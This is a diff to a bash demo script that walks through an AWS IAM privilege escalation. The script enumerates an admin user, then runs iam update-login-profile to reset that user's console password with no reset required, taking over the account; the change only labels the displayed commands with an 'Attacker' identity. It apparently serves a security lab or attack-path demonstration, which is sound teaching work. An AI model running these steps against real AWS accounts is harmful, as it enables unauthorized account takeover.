@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -101,7 +103,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -113,7 +115,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -123,7 +125,7 @@ echo -e "${YELLOW}Step 4: Verifying admin user has existing login profile${NC}"
 echo "Admin user: $ADMIN_USER_NAME"
 echo "Checking for existing console login profile..."
 
-show_cmd "aws iam get-login-profile --user-name $ADMIN_USER_NAME"
+show_cmd "Attacker" "aws iam get-login-profile --user-name $ADMIN_USER_NAME"
 if aws iam get-login-profile --user-name $ADMIN_USER_NAME &> /dev/null; then
     echo -e "${GREEN}✓ Confirmed: Admin user has existing login profile${NC}"
 else
@@ -136,7 +138,7 @@ echo ""
 # Step 5: Verify admin user has administrator access
 echo -e "${YELLOW}Step 5: Checking admin user's permissions${NC}"
 echo "Listing policies attached to admin user..."
-show_cmd "aws iam list-attached-user-policies --user-name $ADMIN_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text"
+show_cmd "Attacker" "aws iam list-attached-user-policies --user-name $ADMIN_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $ADMIN_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text)
 echo "Attached policies: $ATTACHED_POLICIES"
 
@@ -150,7 +152,7 @@ echo ""
 # Step 6: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 6: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -163,7 +165,7 @@ echo -e "${YELLOW}Step 7: Updating login profile via iam:UpdateLoginProfile${NC}
 echo "Changing console password for admin user: $ADMIN_USER_NAME"
 echo "New password: $NEW_PASSWORD"
 
-show_attack_cmd "aws iam update-login-profile --user-name $ADMIN_USER_NAME --password \"$NEW_PASSWORD\" --no-password-reset-required"
+show_attack_cmd "Attacker" "aws iam update-login-profile --user-name $ADMIN_USER_NAME --password \"$NEW_PASSWORD\" --no-password-reset-required"
 aws iam update-login-profile \
     --user-name $ADMIN_USER_NAME \
     --password "$NEW_PASSWORD" \
